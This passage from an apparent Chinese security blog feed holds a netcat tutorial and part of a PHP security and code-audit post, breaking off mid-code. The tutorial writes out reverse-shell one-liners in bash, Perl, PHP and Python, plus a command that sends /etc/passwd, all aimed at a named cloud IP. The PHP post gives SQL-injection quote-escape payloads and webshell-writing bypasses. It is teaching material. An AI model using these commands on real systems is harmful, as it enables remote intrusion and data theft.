    <content type="html"><![CDATA[<p>阿里云ecs:47.106.230.228<br>目标机kali:校园网</p><p>可以输入nc -h查看帮助：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">-h 查看帮助信息</span><br><span class="line">-d 后台模式</span><br><span class="line">-g gateway source-routing hop point[s], up to 8</span><br><span class="line">-G num source-routing pointer: 4, 8, 12, …</span><br><span class="line">-e prog程序重定向，一但连接就执行［危险］</span><br><span class="line">-i secs延时的间隔</span><br><span class="line">-l 监听模式，用于入站连接</span><br><span class="line">-L 监听模式，连接天闭后仍然继续监听，直到CTR+C</span><br><span class="line">-n IP地址，不能用域名(不使用DNS反向查询IP地址的域名)</span><br><span class="line">-o film记录16进制的传输</span><br><span class="line">-p[空格]端口 本地端口号</span><br><span class="line">-s addr 本地源地址</span><br><span class="line">-r 随机本地及远程端口</span><br><span class="line">-t 使用Telnet交互方式</span><br><span class="line">-u UDP模式</span><br><span class="line">-v 详细输出，用-vv将更详细</span><br><span class="line">-w 数字 timeout延时间隔</span><br><span class="line">-z 将输入，输出关掉（用于扫锚时）</span><br></pre></td></tr></table></figure></p><h2 id="PortScan-端口扫描"><a href="#PortScan-端口扫描" class="headerlink" title="PortScan(端口扫描)"></a>PortScan(端口扫描)</h2><p>基本tcp扫描：<br><code>nc -vv 47.106.230.228 6666</code><br><code>例：nc -vv 47.106.230.228 6666扫描47.106.230.228 的tcp 6666端口</code></p><p>设置延时，指定端口扫描：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -vv -w secs ip port-port</span><br><span class="line">例：nc -vv -w 5 192.168.1.1 5000-5002 扫描192.168.1.1的5000-5002端口，网络超时的时间设为5秒。</span><br></pre></td></tr></table></figure></p><h2 id="聊天"><a href="#聊天" class="headerlink" title="聊天"></a>聊天</h2><p>客户端(主动)<br><code>nc ip port</code></p><p>服务端(坐等连)<br><code>nc -lvp port</code></p><h2 id="发文件"><a href="#发文件" class="headerlink" title="发文件"></a>发文件</h2><p>主要看<code>&lt;&gt;</code>符号的尖的方向，表示将文件流到其方向</p><p>发送端<br><code>nc -v -w 20 -p 6666  -l &lt; aaa.txt</code></p><p><code>-w 20</code>表示发送前后都等待20秒,根据箭头表示将文件发送到nc中</p><p>接收端<br><code>nc -v -w 2 47.106.230.228  端口 &gt;bbb.txt</code><br>由于我们是接受端，所以时间不用太久,箭头方向表示将nc接收来的文件保存起来</p><p>总的来看就是这样<br><code>aaa.txt --&gt; nc --&gt; bbb.txt</code></p><h4 id="目标机上下载文件"><a href="#目标机上下载文件" class="headerlink" title="目标机上下载文件"></a>目标机上下载文件</h4><p>攻击机<code>nc  -l -p  6666  &gt;  kali.txt</code><br>目标机<code>nc 47.106.230.228 6666  &lt;  /etc/passwd</code><br>这样就将本地kali的文件发给攻击者了</p><h4 id="上传文件至目标机"><a href="#上传文件至目标机" class="headerlink" title="上传文件至目标机"></a>上传文件至目标机</h4><p>攻击机<code>nc  -l -p  6666  &lt; /etc/passwd</code><br>目标机<code>nc 47.106.230.228 6666  &gt;  ecs.txt</code><br>将攻击机中passwd下载至本地ecs.txt,关于<code>&lt;&gt;</code>的用法和上面介绍的一样</p><h4 id="加密传输的数据"><a href="#加密传输的数据" class="headerlink" title="加密传输的数据"></a>加密传输的数据</h4><p>服务端：$nc localhost 1567 | mcrypt –flush –bare -F -q -d -m ecb &gt; file.txt<br>客户端：$mcrypt –flush –bare -F -q -m ecb &lt; file.txt | nc -l 1567</p><h4 id="命令记录"><a href="#命令记录" class="headerlink" title="命令记录"></a>命令记录</h4><p><code>nc -vv victim_ip port &lt; path\file.cmd</code></p><h4 id="搭建蜜罐"><a href="#搭建蜜罐" class="headerlink" title="搭建蜜罐"></a>搭建蜜罐</h4><ul><li><code>nc -L -p 80</code> 作为蜜罐用1：开启并不停地监听80端口，直到CTR+C为止</li><li><code>nc -L -p 80 &gt; c:\log.txt</code>作为蜜罐用2：开启并不停地监听80端口，直到CTR+C,同时把结果输出到c:\log.txt<br>*<code>nc -L -p 80 &lt; c:\honeyport.txt</code>作为蜜罐用3-1：开启并不停地监听80端口，直到CTR+C,并把c:\honeyport.txt中内容送入管道中，亦可起到传送文件作用</li><li><code>type.exe c:\honeyport | nc -L -p 80</code>作为蜜罐用3-2：开启并不停地监听80端口，直到CTR+C,并把c:\honeyport.txt中内容送入管道中,亦可起到传送文件作用</li></ul><p>作为蜜罐使用1：</p><p>命令：<code>nc -L -p  Port</code></p><p>注：使用“-L”参数可以不停的监听某一个端口，知道Ctrl+C为止</p><p>作为蜜罐使用2：</p><p>命令：<code>nc -L -p  Port &gt;log.txt</code></p><p>注：使用<code>“-L”</code>参数可以不停的监听某一个端口，知道Ctrl+C为止，同时把结果输出到log.txt文件中，如果把<code>“&gt;”</code>改为<code>“&gt;&gt;”</code>即追加到文件之后。</p><p>这一个命令参数<code>“-L”</code>在Windows中有，现在的Linux中是没有这个选项的，但是自己可以去找找，这里只是想到了之前的这个使用，所以提出来简单介绍一下！</p><h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><h3 id="正向shell-没有公网ip的主机发起对目标主机的远程连接"><a href="#正向shell-没有公网ip的主机发起对目标主机的远程连接" class="headerlink" title="正向shell(没有公网ip的主机发起对目标主机的远程连接)"></a>正向shell(没有公网ip的主机发起对目标主机的远程连接)</h3><p>公网服务器:47.106.230.228<br>校园网kali</p><p>服务器<br><code>nc -lvp 6666 -t -e /bin/bash</code></p><p>目标主机(可以执行命令)<br><code>nc 47.106.230.228 6666</code></p><h3 id="反向shell"><a href="#反向shell" class="headerlink" title="反向shell"></a>反向shell</h3><p><img src="https://i.loli.net/2018/10/01/5bb1cebd65fee.jpg" alt="Netcat-reverse-shell.jpg"></p><p><code>–e</code>选项发送回一个BashShell的攻击。请注意，我们还可以使用cmd.exe的<code>–e</code>选项的窗口</p><p>netcat监听者<code>nc -lvp 6666</code><br>目标主机<code>nc 47.106.230.228 6666 -e /bin/bash</code><br>对于Windows：<br><code>nc 47.106.230.228 6666 -e cmd.exe</code></p><h4 id="目标主机中没有nc"><a href="#目标主机中没有nc" class="headerlink" title="目标主机中没有nc"></a>目标主机中没有nc</h4><p>上面的情况是目标主机中有nc，如果没有怎么办呢?<br>攻击照常监听<code>nc -lvp 6666</code><br>目标主机<code>bash -i&gt;&amp; /dev/tcp/47.106.230.228/6666 0&gt;&amp;1</code></p><p><img src="https://i.loli.net/2018/10/01/5bb1d32d6f137.jpg" alt="Netcat-basics-Reverse-shell-bash-6.jpg"></p><p>注意空格</p><h5 id="使用Perl"><a href="#使用Perl" class="headerlink" title="使用Perl"></a>使用Perl</h5><p>攻击照常监听<code>nc -lvp 6666</code></p><p>目标主机<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">'use Socket;$i="47.106.230.228";$p=6666;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></span><br></pre></td></tr></table></figure></p><h5 id="PHP-shell"><a href="#PHP-shell" class="headerlink" title="PHP shell"></a>PHP shell</h5><p>攻击照常监听<code>nc -lvp 6666</code></p><p>目标主机<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">'$sock=fsockopen("47.106.230.228",6666);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure></p><h5 id="Python-shell"><a href="#Python-shell" class="headerlink" title="Python shell"></a>Python shell</h5><p>攻击照常监听<code>nc -lvp 6666</code></p><p>目标主机<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("47.106.230.228",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></span><br></pre></td></tr></table></figure></p><p><a href="https://www.hackingtutorials.org/networking/hacking-with-netcat-part-3-advanced-techniques/" target="_blank" rel="noopener">流量转发</a></p><h2 id="从nc升级到msf"><a href="#从nc升级到msf" class="headerlink" title="从nc升级到msf"></a>从nc升级到msf</h2><h3 id="简单"><a href="#简单" class="headerlink" title="简单"></a>简单</h3><p>攻击机<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/x64/shell/reverse_tcp</span><br><span class="line">set lhost 47.106.230.228(ecs本机ip)</span><br><span class="line">set lport 6666</span><br></pre></td></tr></table></figure></p><p>目标主机<br><code>nc 47.106.230.228 6666 -e /bin/bash</code></p><p><img src="https://i.loli.net/2018/10/01/5bb1d84d6abd4.png" alt=""></p><p>成功获取回话</p><h2 id="资料"><a href="#资料" class="headerlink" title="资料:"></a>资料:</h2><p><a href="https://www.anquanke.com/post/id/87017" target="_blank" rel="noopener">https://www.anquanke.com/post/id/87017</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;阿里云ecs:47.106.230.228&lt;br&gt;目标机kali:校园网&lt;/p&gt;
&lt;p&gt;可以输入nc -h查看帮助：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span cl
      
    
    </summary>
    
    
      <category term="netcat" scheme="https://threst.github.io/tags/netcat/"/>
    
  </entry>
  
  <entry>
    <title>php安全</title>
    <link href="https://threst.github.io/2018/10/04/php%E5%AE%89%E5%85%A8/"/>
    <id>https://threst.github.io/2018/10/04/php安全/</id>
    <published>2018-10-04T05:34:12.000Z</published>
    <updated>2018-10-04T07:21:47.693Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-PHP敏感配置项"><a href="#0x01-PHP敏感配置项" class="headerlink" title="0x01 PHP敏感配置项"></a>0x01 PHP敏感配置项</h1><h2 id="register-globals-php版本小于5-4时存在"><a href="#register-globals-php版本小于5-4时存在" class="headerlink" title="register_globals(php版本小于5.4时存在)"></a>register_globals(php版本小于5.4时存在)</h2><p>当该配置项为ON时，会把用户通过GET、POST提交的参数自动注册成全局变量。当代码中存在有未初始化的变量时，可能会导致变量覆盖的问题；</p><p>(PS:其中参数覆盖的顺序受到配置文件中variables_order的参数影响，默认是EGPCS。按顺序，右边的参数来源会覆盖左边的的参数来源)</p><h2 id="allow-url-include-php版本大于5-2默认为off"><a href="#allow-url-include-php版本大于5-2默认为off" class="headerlink" title="allow_url_include(php版本大于5.2默认为off)"></a>allow_url_include(php版本大于5.2默认为off)</h2><p>当该配置项为ON时，可以通过include、require等函数进行远程文件包含</p><p>其中有个类似的配置项是allow_url_fopen，这个参数配置为on的时候可以函数中例如file_get_contents中打开url。</p><p>当两个配置项都为ON的时候，可以直接使用url进行远程包含，当include为ON，fopen为OFF时，只能通过php伪协议进行包含</p><h2 id="magic-quato-gpc（php版本小于5-4存在）"><a href="#magic-quato-gpc（php版本小于5-4存在）" class="headerlink" title="magic_quato_gpc（php版本小于5.4存在）"></a>magic_quato_gpc（php版本小于5.4存在）</h2><p>此配置项为ON的时候会对GET、POST、COOKIE变量中的单引号(‘)、双引号(“)、反斜杠（）、空字符(NULL)前添加反斜杠进行转义，注意：这个配置并不会对SERVER变量里的特殊字符进行转义，因此可能会导致referer、client-ip存在注入等漏洞</p><h2 id="magic-quato-runtime（php版本小于5-4存在）"><a href="#magic-quato-runtime（php版本小于5-4存在）" class="headerlink" title="magic_quato_runtime（php版本小于5.4存在）"></a>magic_quato_runtime（php版本小于5.4存在）</h2><p>这个配置和magic_quato_gpc的区别就在于runtime是对从数据库或者文件中取出的数据进行转义，因此只对例如file()、fgets()、fread（）、mysql_fetch_array（）等很多对数据库查询和文件读取的函数产生影响</p><h2 id="magic-quato-sybase（php版本小于5-4存在）"><a href="#magic-quato-sybase（php版本小于5-4存在）" class="headerlink" title="magic_quato_sybase（php版本小于5.4存在）"></a>magic_quato_sybase（php版本小于5.4存在）</h2><p>这个配置和magic_quato_gpc 的区别在于，sybase只会转义空字符，把单引号转为双引号，并且这个配置如果为ON会覆盖gpc的配置</p><h2 id="open-basedir"><a href="#open-basedir" class="headerlink" title="open_basedir"></a>open_basedir</h2><p>这个配置用来设置限定php程序只能访问哪些目录。在windows下，多个目录用分号（;）分割，linux下用冒号(:)进行分割。注意的是配置的目录需要用斜杠（/）进行封尾，否则就变成了前缀匹配。例如，配置/var/test，那么/var/test和/var/test123都是可以进行访问的，如果指定一个确定的目录就要写成/var/test/</p><h1 id="0x02-PHP常见敏感函数"><a href="#0x02-PHP常见敏感函数" class="headerlink" title="0x02 PHP常见敏感函数"></a>0x02 PHP常见敏感函数</h1><pre><code>注入: select from,mysql_connect,mysql_query,mysql_fetch_*,update,insert,delete宽字节注入: set names gbk、character_set_client=gbk mysql_set_charset(&apos;gbk&apos;),iconv二次编码注入: urldecode,rawurldecode文件包含 : include,include_once 、require、require_once文件上传 : move_upload_file任意文件删除 : unlink、session_destory代码注入 : eval assert,preg_replace(/e),call_user_func,call_user_func_array,array_map等命令执行: system、exec、shell_exec、passthru 、pctnl_exec、popen、proc_exec、变量覆盖: extract、parse_str、$$反序列化: unserialize随机数: rand、mt_rand</code></pre><h1 id="0x03-常见漏洞解析"><a href="#0x03-常见漏洞解析" class="headerlink" title="0x03 常见漏洞解析"></a>0x03 常见漏洞解析</h1><h2 id="各种问题可以导致系统重装"><a href="#各种问题可以导致系统重装" class="headerlink" title="各种问题可以导致系统重装"></a>各种问题可以导致系统重装</h2><p>一般程序都是通过判断install文件下有没有安装过程中生成的以lock为后缀的文件或者config配置文件来判断有没有安装。</p><h3 id="1-未对系统是否已经安装进行判断"><a href="#1-未对系统是否已经安装进行判断" class="headerlink" title="1.未对系统是否已经安装进行判断"></a>1.未对系统是否已经安装进行判断</h3><p>例如PHPSHE B2C商城1.6（wooyun 2014-062047）<br>可以看到代码未对是否安装进行任何判断，直接进入安装流程</p><h3 id="2-变量覆盖绕过"><a href="#2-变量覆盖绕过" class="headerlink" title="2.变量覆盖绕过"></a>2.变量覆盖绕过</h3><p>例如frcms (wooyun 2014-073244)<br>其中主要的漏洞代码是</p><pre><code>foreach(Array(&apos;_GET&apos;,&apos;_POST&apos;,&apos;_COOKIE&apos;) as $_request){    foreach($$_request as $_k =&gt; $_v) ${$_k} = _runmagicquotes($_v);}</code></pre><p>他会把你从GET、POST、COOKIE中的变量注册为全局变量，因此我们直接通过GET参数提交$insLockfile变量即可绕过</p><h3 id="3-判断已安装后未exit-退出程序"><a href="#3-判断已安装后未exit-退出程序" class="headerlink" title="3.判断已安装后未exit()退出程序"></a>3.判断已安装后未exit()退出程序</h3><p>例如startbbs （wooyun-2013-045143）</p><pre><code>class Install extends Install_Controller{function __construct (){    parent::__construct();    $this-&gt;load-&gt;library(&apos;myclass&apos;);    $file=FCPATH.&apos;install.lock&apos;;    if (file_exists($file)){        $this-&gt;myclass-&gt;notice(&apos;alert(&quot;系统已安装过&quot;);window.location.href=&quot;&apos;.site_url().&apos;&quot;;&apos;);    }}</code></pre><p>可以看到其中判断install.lock文件存在后直接使用js代码将用户进行重定向，但是并没有die程序，直接从前端删除返回的js代码即可重装</p><h3 id="4-还可以借助任意文件删除的漏洞来删除lock文件，然后进行重装（PS-这个就留在任意文件删除再分析）"><a href="#4-还可以借助任意文件删除的漏洞来删除lock文件，然后进行重装（PS-这个就留在任意文件删除再分析）" class="headerlink" title="4.还可以借助任意文件删除的漏洞来删除lock文件，然后进行重装（PS:这个就留在任意文件删除再分析）"></a>4.还可以借助任意文件删除的漏洞来删除lock文件，然后进行重装（PS:这个就留在任意文件删除再分析）</h3><p>例如: 用thinkphp 改造的hdcms （wooyun-2015-092061）<br>我们先跟着框架走一遍，首先查看入口文件index.php</p><p>首先定义了一些基本的框架目录，然后就直接开始引入框架文件，我们进入框架初始化文件hdphp.php</p><p>前面还是检测一次是否成功初始化常量，然后检测是否进行过编译，否则就载入文件进行首次编译，然后进行boot的run方法，查看该方法内容。</p><p>前面依然是定义了各种常量，我们可以直接跳过，来到最后的应用初始化，查看该方法</p><p>可以看到module_path常量是通过将get形式提交的var_group参数进行拼接的，然后又将module_path拼接入module_config_path，最后使用require进行了文件包含。（PS:因为这里后面制定了config.php，所以需要用到%00进行截断）</p><p>但是我们分析到目前为止只能说是疑似存在文件包含漏洞，我们还要看GET参数接收时有没有进行过滤，于是我们进入之前的解析路由方法route::parseurl()，代码较长我就不贴图了，里面就是将url中的参数进行截取解析，没有进行任何的过滤和检测，因此可以确定此处存在文件包含漏洞。因此我们接下来需要确定输入点，可以发现变量是通过thinkphp中获取参数的C方法进行获取的，而C方法获取的变量在config.php中，于是我们查看文件中可以看到var_group对应的变量是g</p><p>因此我们可以先上传一个文件然后index.php?g=../test.php%00</p><p>之前的文件包含漏洞我们是通过index.php这个入口文件一步步搞懂cms框架然后进行审计。除了这种方法，我们还可以直接定位数据库查询语句或者功能附近，看看传入的数据有没有被进行清洗。</p><p>注入漏洞这里我们就用两个有意思的骚操作来分析一下</p><h4 id="1-Ecshop-支付宝插件全局转义绕过导致sql注入"><a href="#1-Ecshop-支付宝插件全局转义绕过导致sql注入" class="headerlink" title="1.Ecshop 支付宝插件全局转义绕过导致sql注入"></a>1.Ecshop 支付宝插件全局转义绕过导致sql注入</h4><p>其实在ECshop中的init.php中对用户输入的参数进行了全局转义</p><p>但是我们来到来到案发现场看看，巧妙的运用str_replace的替换功能来帮助单引号进行逃逸</p><p>其中的核心漏洞代码是$order_sn = str_replace($_GET[‘subject’], ‘’, $_GET[‘out_trade_no’]);其中代码对用户提交的out_trade_no参数中将subject替换为空，然后送入check_money函数中的sql查询语句.<br>这个漏洞的关键在于str_replace函数中的替换内容和源字符串都是可控的。<br>理解这个漏洞之前我们再来回顾一下php中addslashes中的转义处理机制[--&gt;\,”–&gt;\”,”–&gt;\”,null–&gt;\0]<br>于是我们可以提交out_trade_no参数为%00’后面再跟上我们的payload，提交的subject参数为0，我们来看一下数据转换过程.<br>out_trade_no=%00’ ————&gt;经过全局gpc转义————&gt; out_trade_no=\0\’————&gt;送入str_replace函数处理，将0替换————&gt;out_trade_no=\‘ 也就是等于了’，最终也就成功在sql语句中引入了一个单引号，从而可以进行注入</p><h4 id="2-格式化字符串导致的单引号逃逸"><a href="#2-格式化字符串导致的单引号逃逸" class="headerlink" title="2.格式化字符串导致的单引号逃逸"></a>2.格式化字符串导致的单引号逃逸</h4><p>再来分析一下前段时间出来的wordpress格式化字符导致的注入</p><p>具体的代码分析在这就不贴图了，我们直接来分析一下格式化字符串漏洞的核心原理，其中一个关键点就是sprintf的padding特性</p><p>printf（）和sprintf（）函数中可以通过使用%接一个字符来进行padding功能</p><p>例如%10s 字符串会默认在左侧填充空格至长度为10，还可以 %010s 会使用字符0进行填充，但是如果我们想要使用别的字符进行填充，需要使用 ‘ 单引号进行标识，例如 %’#10s 这个就是使用#进行填充（百分号不仅会吃掉’单引号，还会吃掉 斜杠）</p><p>同时sprintf（）可以使用指定参数位置的写法</p><p>%后面的数字代表第几个参数，$后代表格式化类型</p><p>于是当我们输入的特殊字符被放到引号中进行转义时，但是又使用了sprintf函数进行拼接时,例如%1$’%s’ 中的 ‘%被当成使用%进行padding，导致后一个’逃逸了</p><p>还有一种情况就是’被转义成了’,例如输入%’ and 1=1#进入，存在SQL过滤，’被转成了\’<br>于是sql语句变成了select * from user where username = ‘%\’ and 1=1#’;<br>如果这个语句被使用sprintf函数进行了拼接，%后的被吃掉了，导致了’逃逸</p><pre><code>&lt;?php$sql = &quot;select * from user where username = &apos;%\&apos; and 1=1#&apos;;&quot;;$args = &quot;admin&quot;;echo sprintf( $sql, $args ) ;//result: select * from user where username = &apos;&apos; and 1=1#&apos;?&gt;</code></pre><p>不过这样容易遇到 PHP Warning: sprintf(): Too few arguments的报错<br>这个时候我们可以使用%1$来吃掉转移添加的\</p><pre><code>&lt;?php$sql = &quot;select * from user where username = &apos;%1$\&apos; and 1=1#&apos; and password=&apos;%s&apos;;&quot;;$args = &quot;admin&quot;;echo sprintf( $sql, $args) ;//result: select * from user where username = &apos;&apos; and 1=1#&apos; and password=&apos;admin&apos;;?&gt;</code></pre><h1 id="0x03-php安全"><a href="#0x03-php安全" class="headerlink" title="0x03 php安全"></a>0x03 php安全</h1><h2 id="strcmp-弱类型比较特性"><a href="#strcmp-弱类型比较特性" class="headerlink" title="strcmp 弱类型比较特性"></a>strcmp 弱类型比较特性</h2><p>strcmp是C与PHP中常用的一个函数，用来比较两个字符串是否相等。如果二者相等，则返回数字0，否则返回其他数字。 strcmp函数当我们传入一个数组和一个字符串时，将会触发一个警告，函数返回FALSE。由于PHP弱类型的特性，FASLE == 0，会让系统误认为返回的值是0，最后绕过strcmp函数的判断。</p><h2 id="Linux-PHP-写入与删除文件差异特性"><a href="#Linux-PHP-写入与删除文件差异特性" class="headerlink" title="Linux PHP 写入与删除文件差异特性"></a>Linux PHP 写入与删除文件差异特性</h2><p>有时候目标网站存在任意文件上传漏洞，但操作执行完成后即刻删除，导致我们的webshell无法保留在服务器上。这种情况多存在于一些有缓存文件、临时文件的逻辑中，在实战里经常遇到。 Linux下，php的文件写入与移动删除等操作中，由于对于路径的处理存在差异，在有上述情况存在时，我们可以通过传入文件名为shell.php/.的文件，绕过删除函数。</p><h2 id="preg-replace-利用-0-截断执行代码"><a href="#preg-replace-利用-0-截断执行代码" class="headerlink" title="preg_replace 利用 \0 截断执行代码"></a>preg_replace 利用 \0 截断执行代码</h2><p>有些情况下，我们可控preg_replace的第一个参数（正则表达式）中的部分内容。 在PHP5.4.7以前，preg_replace的第一个参数可以利用\0进行截断，并将正则模式修改为e。众所周知，e模式的正则支持执行代码，此时将可构造一个任意代码执行漏洞。</p><h2 id="利用php-filter流绕过死亡exit"><a href="#利用php-filter流绕过死亡exit" class="headerlink" title="利用php filter流绕过死亡exit"></a>利用php filter流绕过死亡exit</h2><p>很多开发者在写入缓存、日志、配置文件的时候，通过在文件开头增加&lt;?php exit; ?&gt;。此时，即使用户控制文件内容，也无法执行。 我们可以利用PHP的filter流，通过php://filter/write=string.strip_tags|convert.base64-decode/resource=config.php来写入文件。 此时，PHP会先用strip_tags去除死亡exit，再将webshell用base64-decode还原，最终写入的文件中不再有死亡exit。</p><h2 id="filter-var-FILTER-VALIDATE-EMAIL-绕过"><a href="#filter-var-FILTER-VALIDATE-EMAIL-绕过" class="headerlink" title="filter_var FILTER_VALIDATE_EMAIL 绕过"></a>filter_var FILTER_VALIDATE_EMAIL 绕过</h2><p>filter_var是一组PHP中过滤、检测用户输入的方法，其中开发者通常利用filter_var($email, FILTER_VALIDATE_EMAIL)来过滤用户输入的邮箱。 RFC 3696规定邮箱local part部分可以用双引号包裹，双引号内即可填入任意字符。 我们可以利用RFC 3696，传入”aaa’aaa”@example.com，即可保留单引号，并通过filter_var的检测，最终触发SQL注入漏洞。</p><h2 id="控制Nginx虚拟主机的Host"><a href="#控制Nginx虚拟主机的Host" class="headerlink" title="控制Nginx虚拟主机的Host"></a>控制Nginx虚拟主机的Host</h2><p>在同一服务器上运行多个网站，Nginx会根据HTTP数据包中的Host头来区分用户访问的是哪个网站。我们如果修改Host头的值，将不能进入指定的网站。 此时，我们可以借助Nginx特性，用如下两个方法在$_SERVER[‘HTTP_HOST’]中注入恶意代码： 1. 在存在两个Host头时，Nginx取到的是第1个，PHP中取到的是第2个。我们将恶意代码放在第2个位置，将可控制$_SERVER[‘HTTP_HOST’] 2. Nginx在处理Host时，会将Host用冒号分割成hostname和port，port部分被丢弃。所以，将恶意代码放在port位置，即可部分控制$_SERVER[‘HTTP_HOST’]</p><h2 id="利用GBK编码吃反引号"><a href="#利用GBK编码吃反引号" class="headerlink" title="利用GBK编码吃反引号"></a>利用GBK编码吃反引号</h2><p>在开启GPC或模拟全局GPC的CMS中，我们传入的单引号（’）和转义符（\）等将被用一个转义符（\）进行转义，导致我们无法闭合单引号进行注入。 在GBK编码的程序中，部分开发者会用iconv将字符串转换编码后存入数据库。在这种情况下，我们可以利用GBK编码中的0xE55C，转义正常的反斜线，绕过全局GPC进行注入。</p><h2 id="iconv-绕过上传白名单"><a href="#iconv-绕过上传白名单" class="headerlink" title="iconv()绕过上传白名单"></a>iconv()绕过上传白名单</h2><p>在上传文件的过程中，如果目标使用的字符编码和访客操作系统使用的字符编码不同，可能导致上传后的文件名出现乱码。所以，开发者在获取文件名后，通常调用iconv()对其进行编码转换。 如果转换编码的操作在验证文件名后缀操作之后，那么我们可以利用iconv()特性，截断文件名，进而去除白名单中的后缀，造成文件上传漏洞。</p><h2 id="PHP-mt-rand-随机数预测"><a href="#PHP-mt-rand-随机数预测" class="headerlink" title="PHP mt_rand() 随机数预测"></a>PHP mt_rand() 随机数预测</h2><p>mt_rand()生成随机数有如下特点： 1. PHP &gt; 4.2.0中，系统会自动设置随机数种子，相同种子生成的随机数相同 2. 同一进程中，如果多次调用mt_rand()函数，只会自动播种一次 所以，如果同一次我们生成了数个随机数，在知道其中一部分的情况下，即可反推随机数种子。 32位系统中，种子最大值为2^16-1，64位系统中，种子最大值为2^31-1。我们爆破到该种子，即可预测其他未知的随机数。<br><a href="https://mp.weixin.qq.com/s/3TgBKXHw3MC61qIYELanJg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/3TgBKXHw3MC61qIYELanJg</a></p><h2 id="PHP5-rand-随机数预测"><a href="#PHP5-rand-随机数预测" class="headerlink" title="PHP5 rand() 随机数预测"></a>PHP5 rand() 随机数预测</h2><p>PHP5 rand()函数使用了glibc库中的rand()函数，glibc中维护了一个随机数链，其上下文中存在如下关系： state[i] = state[i-3] + state[i-31] return state[i] &gt;&gt; 1 进而导致PHP5中的rand()函数生成的随机数也存在上述关系。如果开发者使用rand()函数生成密钥、salt等安全相关元素，将导致被预测。</p><h2 id="利用json-encode吃转义符"><a href="#利用json-encode吃转义符" class="headerlink" title="利用json_encode吃转义符"></a>利用json_encode吃转义符</h2><p>在开启GPC或模拟全局GPC的CMS中，我们传入的单引号（’）和转义符（\）等将被用一个转义符（\）进行转义，导致我们无法闭合单引号进行注入。 部分开发者会将一些结构复杂内容（如数组）用json_encode编码成一个字符串后存入数据库，在这种情况下，我们可以绕过全局GPC进行注入</p><h2 id="file-put-contents写入文件绕过内容黑名单"><a href="#file-put-contents写入文件绕过内容黑名单" class="headerlink" title="file_put_contents写入文件绕过内容黑名单"></a>file_put_contents写入文件绕过内容黑名单</h2><p>在开发者使用file_put_contents写入文件的时候，有的情况下会用字符串匹配的方式拦截如“&lt;”、”&gt;”、”?”等字符，导致我们无法写入webshell。 file_put_contents函数第二个参数支持传入数组，用户传入的数组将被拼接成一个字符串写入文件。数组因为类型不同导致无法使用字符串匹配来检测，进而利用这种方式绕过了黑名单。</p><h2 id="PHP-MD5-比较的陷阱"><a href="#PHP-MD5-比较的陷阱" class="headerlink" title="PHP MD5 比较的陷阱"></a>PHP MD5 比较的陷阱</h2><p>PHP是一门弱类型语言，在使用“==”进行变量比较的时候，会先进行类型转换，再进行比较操作。即使比较的是两个字符串，如果二者满足“科学计数法”的表达方法，也会先转换成数字再进行比较。 比如： var_dump(“0e1234” == “0e5678”); 其返回结果是true。 在比较md5时，如果目标密码的md5值恰好是“0e”+数字，将可以出现密码绕过漏洞。</p><h2 id="PHP-5-6-11-数组比较Bug"><a href="#PHP-5-6-11-数组比较Bug" class="headerlink" title="PHP 5.6.11 数组比较Bug"></a>PHP 5.6.11 数组比较Bug</h2><p>PHP 5.6.11/5.5.27/5.4.44以前的版本中，存在一处数组比较的Bug（Bug #69892），我们可以通过 var_dump([0 =&gt; 0] === [0x100000000 =&gt; 0]); 来复现该特性。</p><h1 id="0x04-代码审计关注点）"><a href="#0x04-代码审计关注点）" class="headerlink" title="0x04 代码审计关注点）"></a>0x04 代码审计关注点）</h1><h2 id="file-put-contents、copy、file-get-contents等读取写入操作与unlink、file-exists等删除判断文件函数之间对于路径处理的差异导致的删除绕过"><a href="#file-put-contents、copy、file-get-contents等读取写入操作与unlink、file-exists等删除判断文件函数之间对于路径处理的差异导致的删除绕过" class="headerlink" title="file_put_contents、copy、file_get_contents等读取写入操作与unlink、file_exists等删除判断文件函数之间对于路径处理的差异导致的删除绕过"></a>file_put_contents、copy、file_get_contents等读取写入操作与unlink、file_exists等删除判断文件函数之间对于路径处理的差异导致的删除绕过</h2><pre><code>&lt;?php$filename = __DIR__ . &apos;/tmp/&apos; . $user[&apos;name&apos;];$data = $user[&apos;info&apos;];file_put_contents($filename, $data);if (file_exists($filename)) {    